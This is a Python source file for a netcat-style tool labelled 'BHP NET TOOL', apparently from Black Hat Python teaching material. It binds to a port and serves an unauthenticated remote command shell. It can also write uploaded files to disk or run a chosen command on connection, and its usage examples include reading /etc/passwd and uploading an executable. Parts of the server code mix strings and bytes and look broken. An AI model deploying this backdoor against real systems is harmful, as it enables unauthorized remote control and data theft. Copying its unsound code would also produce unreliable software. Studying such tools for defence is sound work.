import getopt
import socket
import subprocess
import sys
import threading
import pdb

listen = False
command = False
upload = False
port = 0
target = ''
execute = ''
upload_destination = ''


def usage():
    """
        Args:none
        Returns:none
    """
    print('BHP NET TOOL')
    print()
    print('Usage:bhpnet.py -t targethost -p port')
    print('-l --listen                  \
    -listen on[host]:[port] for incomming connections')

    print('-e --execute=file_to_run     \
    -execute the given file upon receiving a connection')

    print('-c --command                 \
    -command initialize a command shell')

    print('-u --upload=destination      \
    -upon receiving connection upload a file and write to [destination]')
    print()
    print()
    print('Examples:')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -c')
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"')
    print('bphnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe')
    print('echo "ABCDEFG"|./bphnet.py -t 192.168.0.1 -p 5555')
    sys.exit(0)


def main():
    """
        Args:None
        Returns:None
    """
    global listen
    global port
    global command
    global execute
    global upload_destination
    global target
    if not len(sys.argv[1:]):
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hle:t:p:cu:',
                                   ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for (o, a) in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        elif o in ('-c', '--command'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        else:
            assert False, 'Unkonw option.'
    
    if not listen and len(target) and port > 0:
        # strbuff = input("->")
        # strbuff += '\n'
        client_sender()
    if listen:
        server_loop()


def client_sender():
    """
    Args:strbuff
    Returns:none
    """
    global target
    global port
    client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        # if len(strbuff):
        #     client.send(strbuff.encode())
        while True:
            recv_len = 1
            response = ''
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode()
                if recv_len < 4096:
                    break
            if '\n' in response:
                print(response,end='')
            else:
                strbuff = input(response)
                strbuff += '\n'
                client.send(strbuff.encode())
    except:
        print("[*] Exception exit.")


def server_loop():
    global target
    global port
    if not len(target):
        target = '0.0.0.0'
    server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        (client, addr) = server.accept()
        client_thread=threading.Thread(target=client_hander,args=(client,))
        client_thread.start()

def client_hander(client):
    global command
    global upload
    global execute
    global upload_destination

    if len(upload_destination):
        file_buff=''
        while True:
            data=client.recv(1024)
            if not data:
                break
            else:
                file_buff+=data
        try:
            file_descriptor=open(upload_destination,'wb')
            file_descriptor.write(file_buff)
            file_descriptor.close()
            client.send("Success to save file to %s\r\n" % upload_destination)
        except:
            client.send("Failed to save file to %s\r\n" % upload_destination)
    if len(execute):
        output=client_command(execute)
        client.send(output)
    if command:
        while  True:
            client.send('<BHP:#>')
            command_buff=''
            while  '\n' not in command_buff:
                command_buff+=client.recv(1024)
            output=client_command(command_buff)
            client.send(output)



def client_command(command):
    command=command.rstrip()
    try:
        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output='Failed to execute command\r\n'
    return output


if __name__ == '__main__':
    main()
